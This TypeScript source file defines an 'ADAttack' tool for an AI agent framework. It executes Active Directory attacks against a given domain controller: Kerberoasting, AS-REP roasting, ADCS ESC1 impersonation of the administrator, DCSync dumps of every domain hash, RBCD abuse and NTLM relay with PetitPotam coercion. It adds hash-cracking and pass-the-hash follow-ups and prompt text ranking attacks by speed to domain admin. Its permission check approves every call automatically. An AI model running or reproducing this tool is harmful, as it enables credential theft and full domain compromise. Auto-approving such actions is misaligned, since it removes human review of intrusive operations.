import { join } from 'path'
import { z } from 'zod/v4'
import { buildTool, type ToolDef, type ToolUseContext } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { ensureOutputDir, normalizeNtHash, resolveAuth, runADCommand } from '../shared/adUtils.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

export const AD_ATTACK_TOOL_NAME = 'ADAttack'

const inputSchema = lazySchema(() =>
  z.strictObject({
    action: z
      .enum(['kerberoast', 'asreproast', 'adcs_exploit', 'dcsync', 'rbcd_setup', 'relay_setup'])
      .describe(
        'kerberoast=dump TGS hashes via GetUserSPNs, asreproast=dump AS-REP hashes via GetNPUsers, adcs_exploit=certipy request+auth for ESC1/ESC3/ESC8, dcsync=secretsdump via DCSync, rbcd_setup=configure RBCD via dacledit+getST, relay_setup=print ntlmrelayx + responder command for NTLM relay',
      ),
    dc_ip: z.string().describe('Domain Controller IP'),
    domain: z.string().describe('AD domain FQDN (e.g. "contoso.local")'),
    username: z.string().optional().describe('Attacker-controlled username'),
    password: z.string().optional().describe('Cleartext password'),
    nt_hash: z.string().optional().describe('NT hash (format: LMHASH:NTHASH or just 32-char NT)'),
    // adcs_exploit specific
    ca_name: z.string().optional().describe('CA name for adcs_exploit (e.g. "contoso-CA")'),
    template: z.string().optional().describe('Certificate template name for adcs_exploit'),
    upn: z.string().optional().describe('Target UPN for ESC1 (e.g. "administrator@contoso.local")'),
    // rbcd_setup specific
    target_computer: z.string().optional().describe('Target computer for RBCD (e.g. "DC01$")'),
    attacker_computer: z.string().optional().describe('Attacker-controlled computer account for RBCD'),
    attacker_computer_hash: z.string().optional().describe('Hash for attacker computer account'),
    // relay_setup specific
    relay_target: z.string().optional().describe('Target IP to relay to (for relay_setup)'),
    relay_type: z.enum(['ldap', 'smb', 'adcs']).optional().describe('Relay target type (default: ldap)'),
    timeout_secs: z.number().int().min(30).max(3600).default(180).describe('Timeout in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    success: z.boolean(),
    action: z.string(),
    command: z.string(),
    stdout: z.string(),
    stderr: z.string(),
    output_dir: z.string().optional(),
    next_steps: z.string().optional(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

async function runADAttack(input: z.infer<InputSchema>, context: ToolUseContext): Promise<Output> {
  const outputDir = await ensureOutputDir(input.domain, 'ad-attack')
  const { hash, hasAuth } = resolveAuth(input.username ?? '', input.password ?? '', input.nt_hash)
  const userArg = input.username ?? ''
  const passArg = input.password ?? ''

  let binary: string
  let args: string[]
  let description: string
  let nextSteps: string | undefined

  switch (input.action) {
    case 'kerberoast': {
      if (!hasAuth) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'kerberoast requires credentials' }
      }
      binary = '/usr/sbin/GetUserSPNs.py'
      args = [`${input.domain}/${userArg}`]
      if (hash) args.push('-hashes', hash)
      else args.push('-p', passArg)
      args.push('-dc-ip', input.dc_ip, '-request', '-outputfile', join(outputDir, 'kerberoast-hashes.txt'))
      description = `Kerberoast: ${input.domain}`
      nextSteps = `Crack with: hashcat -m 13100 ${join(outputDir, 'kerberoast-hashes.txt')} /usr/share/wordlists/rockyou.txt`
      break
    }
    case 'asreproast': {
      binary = '/usr/sbin/GetNPUsers.py'
      args = [`${input.domain}/`]
      if (hasAuth) {
        args.push('-u', userArg)
        if (hash) args.push('-hashes', hash)
        else args.push('-p', passArg)
      } else {
        args.push('-no-pass')
      }
      args.push('-dc-ip', input.dc_ip, '-request', '-outputfile', join(outputDir, 'asrep-hashes.txt'), '-format', 'hashcat')
      description = `AS-REP roast: ${input.domain}`
      nextSteps = `Crack with: hashcat -m 18200 ${join(outputDir, 'asrep-hashes.txt')} /usr/share/wordlists/rockyou.txt`
      break
    }
    case 'adcs_exploit': {
      if (!hasAuth) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'adcs_exploit requires credentials' }
      }
      if (!input.ca_name || !input.template) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'adcs_exploit requires ca_name and template. Run ADRecon adcs_enum first.' }
      }
      const targetUpn = input.upn ?? `administrator@${input.domain}`
      binary = '/usr/sbin/certipy'
      args = [
        'req',
        '-u', `${userArg}@${input.domain}`,
        // Auth: prefer hash over password
        ...(hash ? ['-hashes', hash] : ['-p', passArg]),
        '-ca', input.ca_name,
        '-template', input.template,
        '-upn', targetUpn,
        '-dc-ip', input.dc_ip,
        '-out', join(outputDir, 'adcs-cert'),
      ]
      description = `Certipy ESC1: ${input.template} → ${targetUpn}`
      nextSteps = `Authenticate with cert: certipy auth -pfx ${join(outputDir, 'adcs-cert.pfx')} -dc-ip ${input.dc_ip}\nThis retrieves NTLM hash for ${targetUpn}. Use with secretsdump or evil-winrm.`
      break
    }
    case 'dcsync': {
      if (!hasAuth) {
        return { success: false, action: input.action, command: '', stdout: '', stderr: '', error: 'dcsync requires credentials with DCSync rights (DA or custom ACL)' }
      }
      binary = '/usr/sbin/secretsdump.py'
      args = [`${input.domain}/${userArg}@${input.dc_ip}`, '-just-dc', '-outputfile', join(outputDir, 'dcsync-hashes')]
      if (hash) args.push('-hashes', hash)
      else args.push('-p', passArg)
      description = `DCSync: ${input.domain} → ${input.dc_ip}`
      nextSteps = `Hashes in ${join(outputDir, 'dcsync-hashes.ntds')}. Use with evil-winrm -H <NTLM> or pass-the-hash.`
      break
    }
    case 'rbcd_setup': {
      if (!hasAuth || !input.target_computer || !input.attacker_computer) {
        return {
          success: false, action: input.action, command: '', stdout: '', stderr: '',
          error: 'rbcd_setup requires credentials, target_computer, and attacker_computer',
        }
      }
      binary = '/usr/sbin/dacledit.py'
      args = [
        '-action', 'write',
        '-rights', 'RbcdRights',
        '-principal', input.attacker_computer,
        '-target', input.target_computer,
        `${input.domain}/${userArg}`,
        '-dc-ip', input.dc_ip,
      ]
      if (hash) args.push('-hashes', hash)
      else args.push('-p', passArg)
      description = `RBCD setup: ${input.target_computer} ← ${input.attacker_computer}`
      const attHash = input.attacker_computer_hash ? normalizeNtHash(input.attacker_computer_hash) : '<HASH>'
      nextSteps = `After dacledit succeeds, get silver ticket:\ngetST.py -spn cifs/${input.target_computer} -impersonate Administrator -dc-ip ${input.dc_ip} ${input.domain}/${input.attacker_computer} -hashes ${attHash}\nThen: export KRB5CCNAME=Administrator@cifs_${input.target_computer}.ccache\nAnd: wmiexec.py -k -no-pass ${input.domain}/Administrator@${input.target_computer}`
      break
    }
    case 'relay_setup': {
      const relayType = input.relay_type ?? 'ldap'
      const relayTarget = input.relay_target ?? input.dc_ip
      const commands: string[] = [
        '# 1. Edit /etc/responder/Responder.conf: set SMB = Off, HTTP = Off',
        '# 2. Start Responder (captures NTLMv2 on other protocols):',
        'responder -I eth0 -rdwv',
        `# 3. Start ntlmrelayx targeting ${relayType}://${relayTarget}:`,
      ]
      if (relayType === 'ldap') {
        commands.push(
          `/usr/sbin/ntlmrelayx.py -t ldap://${relayTarget} --no-dump --delegate-access -smb2support`,
          '# If no LDAP signing: --no-dump dumps secrets automatically',
        )
      } else if (relayType === 'smb') {
        commands.push(`/usr/sbin/ntlmrelayx.py -t smb://${relayTarget} -smb2support -c 'cmd /c whoami'`)
      } else {
        commands.push(
          `/usr/sbin/ntlmrelayx.py -t http://${relayTarget}/certsrv/certfnsh.asp --adcs --template DomainController -smb2support`,
          `# After relay: certipy auth -pfx b64.pfx -dc-ip ${input.dc_ip}`,
        )
      }
      commands.push(
        '# 4. Coerce authentication (in another terminal):',
        `nxc smb ${input.dc_ip} -u ${userArg} -p '${passArg}' -M petitpotam -o LISTENER=<your-ip>`,
      )
      return {
        success: true,
        action: 'relay_setup',
        command: commands.join('\n'),
        stdout: commands.join('\n'),
        stderr: '',
        output_dir: outputDir,
        next_steps: 'Run the above commands in separate terminals. Captured hashes relay to target automatically.',
      }
    }
  }

  const command = `${binary} ${args.join(' ')}`
  const { stdout, stderr, code } = await runADCommand({
    binary, args, description,
    timeoutMs: input.timeout_secs * 1000,
    context,
  })

  return {
    success: code === 0,
    action: input.action,
    command,
    stdout,
    stderr,
    output_dir: outputDir,
    next_steps: nextSteps,
    ...(code !== 0 && { error: `Exit code ${code}` }),
  }
}

export const ADAttackTool = buildTool({
  name: AD_ATTACK_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'active directory attacks — kerberoast TGS dump, AS-REP roast, ADCS certificate ESC1 exploitation, DCSync NTDS dump, RBCD setup, NTLM relay configuration',
  maxResultSizeChars: 30_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    if (i.action && i.domain) return `AD Attack: ${i.action} on ${i.domain}`
    return 'Active Directory attack execution'
  },
  async prompt() {
    return `Active Directory attack execution. Use after ADReconTool identifies vulnerabilities.

### Priority order (highest impact first):
1. adcs_exploit (ESC1/ESC3/ESC8) — instant DA via cert request, no brute force
2. dcsync — dump all domain hashes when DA rights obtained
3. relay_setup — NTLM relay to LDAP/ADCS if SMB signing disabled
4. rbcd_setup — RBCD via dacledit when write access to target
5. kerberoast — crack TGS hashes offline (hashcat -m 13100 + rockyou)
6. asreproast — crack AS-REP hashes offline (hashcat -m 18200 + rockyou)

### Actions:
- kerberoast: dump TGS hashes → crack offline with hashcat -m 13100
- asreproast: dump AS-REP hashes → crack with hashcat -m 18200
- adcs_exploit: ESC1 cert request → NTLM hash of any domain user including DA (requires ca_name + template from adcs_enum)
- dcsync: dump all domain hashes via DCSync (requires DA or custom DCSync ACL rights)
- rbcd_setup: configure Resource-Based Constrained Delegation for lateral movement (requires dacledit rights)
- relay_setup: generate NTLM relay commands for ntlmrelayx + responder (LDAP/SMB/ADCS targets)
Output saved to ~/Targets/<domain>/ad-attack/

After any successful action: HashTool operation=crack_hashcat with fast wordlist first, then rockyou.`
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `ADAttack:${i.action}` : 'ADAttack'
  },
  isConcurrencySafe() {
    return false
  },
  isReadOnly() {
    return false
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `adattack ${i?.action ?? ''} ${i?.dc_ip ?? ''} ${i?.domain ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  async call(input, context) {
    const result = await runADAttack(input as z.infer<InputSchema>, context)
    return { data: result }
  },
  mapToolResultToToolResultBlockParam(data: Output, toolUseID) {
    const lines: string[] = [
      `ADAttack: ${data.action} — ${data.success ? 'OK' : 'FAILED'}`,
    ]
    if (data.command) lines.push(`Command: ${data.command}`)
    if (data.output_dir) lines.push(`Output dir: ${data.output_dir}`)
    if (data.error) lines.push(`Error: ${data.error}`)
    lines.push('')
    if (data.stdout) lines.push('--- stdout ---', data.stdout)
    if (data.stderr) lines.push('--- stderr ---', data.stderr)
    if (data.next_steps) lines.push('', '--- next steps ---', data.next_steps)
    return {
      tool_use_id: toolUseID,
      type: 'tool_result' as const,
      content: lines.join('\n'),
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i.action && i.domain ? `AD attack: ${i.action} ${i.domain}` : 'AD attack'
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i.action && i.domain ? `${i.action}: ${i.domain}` : 'ad-attack'
  },
  renderToolResultMessage,
} satisfies ToolDef<InputSchema, Output>)
